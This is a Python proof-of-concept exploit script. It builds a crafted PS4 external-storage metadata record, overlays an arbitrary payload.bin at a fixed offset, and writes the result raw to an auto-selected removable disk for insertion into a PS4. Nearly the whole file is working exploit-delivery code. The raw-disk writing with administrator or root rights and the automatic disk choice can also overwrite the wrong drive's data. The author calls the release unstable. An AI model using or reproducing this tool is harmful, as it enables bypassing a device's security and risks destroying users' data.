#!/usr/bin/env python3
"""

                        THIS WAS A SHITSHOW.
                    I WILL RELEASE IT IN ITS CURRENT STATE, IT WILL PROBABLY BE FUCKY.

    python poc.py                  # auto-pick payload.bin + first removable
    python poc.py --disk 1         # explicit disk index
    python poc.py --no-write       # merge only -> merged.bin
    python poc.py --list           # list disks, exit
"""

import os, sys, re, json, struct, platform, subprocess, argparse
from pathlib import Path

# ---- layout constants -----------------------------------------------------
LABEL      = b"PS4 External Storage Metadata R\x00"
LABEL_OFF  = 0x6000
VER_OFF    = 0x6024
LEN_A_OFF  = 0x6030
LEN_B_OFF  = 0x6038
BODY_OFF   = 0x6040          # <- payload goes here
SECTOR     = 512
WINDOW     = 0x1000000       # 16 MB record window

# Known-good values from a 931 GB JMicron drive (verified 918.4 GB display)
LEN_A_GOOD = 0x000000E86A034000
LEN_B_GOOD = 0x000000E86A00E000

IS_WIN = platform.system() == "Windows"
IS_LIN = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"

HERE = Path(__file__).resolve().parent

# ---- raw device I/O -------------------------------------------------------

if IS_WIN:
    import ctypes
    from ctypes import wintypes
    GR, GW = 0x80000000, 0x40000000
    OPEN_EXISTING, SHARE_RW = 3, 3
    INVALID = ctypes.c_void_p(-1).value
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
        ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    k32.CreateFileW.restype = wintypes.HANDLE
    k32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong,
        ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
    k32.ReadFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    k32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    k32.CloseHandle.argtypes = [wintypes.HANDLE]

    def _open(path, write):
        a = GR | (GW if write else 0)
        h = k32.CreateFileW(path, a, SHARE_RW, None, OPEN_EXISTING, 0, None)
        if h == INVALID or h is None:
            raise OSError(f"open {path}: errno {ctypes.get_last_error()} "
                          f"(run as Administrator)")
        return h
    def _seek(h, off):
        n = ctypes.c_longlong(0)
        k32.SetFilePointerEx(h, ctypes.c_longlong(off), ctypes.byref(n), 0)
    def _read(h, off, n):
        _seek(h, off)
        buf = ctypes.create_string_buffer(n); got = wintypes.DWORD()
        k32.ReadFile(h, buf, n, ctypes.byref(got), None)
        return buf.raw[:got.value]
    def _write(h, off, data):
        if len(data) % SECTOR:
            raise ValueError(f"unaligned write {len(data)}")
        _seek(h, off)
        buf = ctypes.create_string_buffer(data, len(data)); got = wintypes.DWORD()
        if not k32.WriteFile(h, buf, len(data), ctypes.byref(got), None):
            raise OSError(f"write {off:#x}: errno {ctypes.get_last_error()}")
    def _close(h): k32.CloseHandle(h)
    def devpath(n): return rf"\\.\PhysicalDrive{n}"

    def list_disks():
        ps = ("Get-CimInstance Win32_DiskDrive | "
              "Select-Object Index,Model,Size,InterfaceType,MediaType | "
              "ConvertTo-Json -Compress")
        try:
            out = subprocess.run(["powershell","-NoProfile","-Command",ps],
                                 capture_output=True, text=True, timeout=15).stdout
            d = json.loads(out.strip() or "[]")
            if isinstance(d, dict): d = [d]
            return [{"index": int(x.get("Index", -1)),
                     "model": str(x.get("Model","")),
                     "size":  int(x.get("Size",0)),
                     "iface": str(x.get("InterfaceType","")),
                     "media": str(x.get("MediaType",""))}
                    for x in d]
        except Exception:
            return []

    def dismount(n):
        ps = (f"$ErrorActionPreference='SilentlyContinue';"
              f"Get-Partition -DiskNumber {n} | Where-Object {{$_.DriveLetter}} |"
              f" ForEach-Object {{ mountvol ($_.DriveLetter + ':') /p }}")
        subprocess.run(["powershell","-NoProfile","-Command",ps],
                       capture_output=True)
else:
    def _open(path, write):
        try:
            return os.open(path, os.O_RDWR if write else os.O_RDONLY)
        except PermissionError:
            raise OSError(f"open {path}: permission denied (run as root)")
    def _read(fd, off, n):
        os.lseek(fd, off, 0); d = b""
        while len(d) < n:
            c = os.read(fd, n - len(d))
            if not c: break
            d += c
        return d
    def _write(fd, off, data):
        if len(data) % SECTOR:
            raise ValueError(f"unaligned write {len(data)}")
        os.lseek(fd, off, 0); w = 0
        while w < len(data): w += os.write(fd, data[w:])
    def _close(fd):
        try: os.close(fd)
        except: pass
    def devpath(n):
        try:
            if IS_LIN:
                out = subprocess.run(["lsblk","-J","-b","-o","NAME,TYPE,RM"],
                                     capture_output=True, text=True, timeout=5).stdout
                for d in json.loads(out).get("blockdevices", []):
                    if d.get("type")=="disk" and str(d.get("rm"))=="1":
                        return f"/dev/{d['name']}"
                return f"/dev/sd{chr(ord('a')+n)}"
            if IS_MAC:
                return f"/dev/disk{n}"
        except Exception:
            pass
        return f"/dev/sd{chr(ord('a')+n)}"

    def list_disks():
        out = []
        if IS_LIN:
            try:
                r = subprocess.run(["lsblk","-J","-b","-o",
                                    "NAME,TYPE,SIZE,MODEL,RM,TRAN"],
                                   capture_output=True, text=True, timeout=10).stdout
                for d in json.loads(r).get("blockdevices", []):
                    if d.get("type") != "disk": continue
                    out.append({"index": len(out),
                                "model": (d.get("model") or "").strip(),
                                "size":  int(d.get("size", 0) or 0),
                                "iface": (d.get("tran") or "").upper(),
                                "media": "Removable" if str(d.get("rm"))=="1" else "Fixed",
                                "path":  f"/dev/{d['name']}"})
            except Exception: pass
        return out

    def dismount(n):
        try:
            subprocess.run(["umount", f"/dev/sd{chr(ord('a')+n)}*"],
                           capture_output=True)
        except Exception: pass


# ---- merge ----------------------------------------------------------------

def build_record(payload: bytes, base: bytes | None) -> bytes:
    """
    Compose the crafted record.
    - If base (jm_real.bin) present, use it as the skeleton.
    - Otherwise, synthesize a header with the known-good layout.
    - Payload is overlaid at BODY_OFF.
    - Never truncates the payload; grows the image if needed.
    """
    if base is not None:
        # Verify base has the label where we expect.
        if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
            print(f"  WARN: base has no label at 0x{LABEL_OFF:X}; "
                  f"found at {base.find(LABEL)}")
        size = max(len(base), BODY_OFF + len(payload))
        img = bytearray(size)
        img[:len(base)] = base
    else:
        # Synthesize minimal header.
        size = max(WINDOW, BODY_OFF + len(payload))
        img = bytearray(size)
        img[LABEL_OFF:LABEL_OFF+len(LABEL)] = LABEL
        struct.pack_into("<I", img, VER_OFF, 3)  # version 03 00 00 00

    # Patch capacity fields to known-good values.
    struct.pack_into("<Q", img, LEN_A_OFF, LEN_A_GOOD)
    struct.pack_into("<Q", img, LEN_B_OFF, LEN_B_GOOD)

    # Overlay payload at body offset.
    n = min(len(img) - BODY_OFF, len(payload))
    img[BODY_OFF:BODY_OFF+n] = payload[:n]

    # Pad to sector.
    pad = (-len(img)) % SECTOR
    if pad:
        img += b"\x00" * pad
    return bytes(img)


# ---- write ----------------------------------------------------------------

def write_record(disk_index: int, img: bytes, log=print):
    path = devpath(disk_index) if not (isinstance(disk_index, str)) else disk_index
    log(f"target: {path}")
    log(f"image : {len(img):,} bytes ({len(img)/1024/1024:.2f} MB)")

    # Truncate to sector multiple and to whatever the device can hold.
    # (We do NOT query the device size; we just write and let short-writes
    #  raise. Caller can catch.)
    log("dismounting volumes...")
    try: dismount(disk_index if isinstance(disk_index, int) else 0)
    except Exception: pass

    h = _open(path, True)
    try:
        try:
            saved = _read(h, 0, SECTOR)
            log(f"saved MBR sig {saved[510]:02x} {saved[511]:02x}")
        except Exception as e:
            log(f"WARN: no MBR readback: {e}")
            saved = None

        chunk = 1 << 20
        w = 0
        total = len(img)
        while w < total:
            n = min(chunk, total - w)
            if n % SECTOR:
                n = ((n + SECTOR - 1) // SECTOR) * SECTOR
                if w + n > total: n = total - w
            try:
                _write(h, w, img[w:w+n])
            except OSError as e:
                log(f"write stopped at {w:,}/{total:,}: {e}")
                log("(device too small — truncating)")
                break
            w += n
            pct = (w * 100) // total
            log(f"  {pct:3d}%  {w:,}/{total:,}")

        if saved is not None:
            try:
                _write(h, 0, saved)
                log("MBR restored")
            except Exception as e:
                log(f"WARN: MBR restore failed: {e}")
    finally:
        _close(h)

    # Verify what landed.
    log("verifying...")
    try:
        h = _open(path, False)
        try:
            lab = _read(h, LABEL_OFF, len(LABEL) + 4)
            ok_lab = lab.startswith(LABEL)
            a = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
            ok_a = (a == LEN_A_GOOD)
            log(f"  label  {'OK' if ok_lab else 'MISSING'} ({lab[:32]!r})")
            log(f"  len_a  {'OK' if ok_a else 'MISMATCH'} ({a:#018x})")
            # Sample payload bytes
            sample = _read(h, BODY_OFF, min(32, max(0, len(img) - BODY_OFF)))
            log(f"  body+0 {sample.hex()}")
            return ok_lab and ok_a
        finally:
            _close(h)
    except Exception as e:
        log(f"  verify failed: {e}")
        return False


# ---- main -----------------------------------------------------------------

def find_file(name, explicit=None):
    if explicit:
        p = Path(explicit)
        if p.exists(): return p
        raise SystemExit(f"missing: {explicit}")
    for cand in [HERE / name, Path.cwd() / name]:
        if cand.exists(): return cand
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--payload", default=None, help="payload.bin path")
    ap.add_argument("--base",    default=None, help="jm_real.bin path (optional)")
    ap.add_argument("--disk",    type=int, default=None)
    ap.add_argument("--out",     default="merged_poc.bin")
    ap.add_argument("--no-write", action="store_true")
    ap.add_argument("--list",    action="store_true")
    args = ap.parse_args()

    # Enumerate disks.
    disks = list_disks()
    if args.list:
        for d in disks:
            gb = d.get("size", 0) / (1024**3)
            print(f"[{d['index']:>2}]  {gb:8.2f} GB  "
                  f"{d.get('iface',''):<6}  {d.get('media',''):<16}  "
                  f"{d.get('path', devpath(d['index']))}  {d.get('model','')}")
        return
    if not disks and not args.no_write:
        print("no disks enumerated; use --no-write or run as admin/root")
        if not args.no_write: sys.exit(1)

    # Locate payload.
    payload_path = find_file("payload.bin", args.payload)
    if payload_path is None:
        sys.exit("payload.bin not found next to poc.py or in cwd")
    payload = payload_path.read_bytes()
    print(f"payload : {payload_path} ({len(payload):,} bytes)")

    # Locate base (optional).
    base_path = find_file("jm_real.bin", args.base)
    base = base_path.read_bytes() if base_path else None
    if base:
        print(f"base    : {base_path} ({len(base):,} bytes)")
    else:
        print("base    : (none — synthesizing header)")

    # Build.
    img = build_record(payload, base)
    Path(args.out).write_bytes(img)
    print(f"merged  : {args.out} ({len(img):,} bytes)")

    if args.no_write:
        print("done (--no-write).")
        return

    # Choose disk.
    disk = args.disk
    if disk is None:
        # Prefer removable / USB.
        cand = [d for d in disks
                if str(d.get("media","")).lower().startswith("remov")
                or str(d.get("iface","")).upper() in ("USB",)]
        if not cand:
            cand = disks
        if not cand:
            sys.exit("no candidate disk")
        disk = cand[0]["index"]
        print(f"auto-picked disk {disk}: {cand[0].get('model','')} "
              f"({cand[0].get('size',0)/1024**3:.2f} GB)")

    write_record(disk, img)
    print()
    print("done. eject, insert into PS4, tap 'Use This Extended Storage'.")
    print("if it works, it works.")


if __name__ == "__main__":
    main()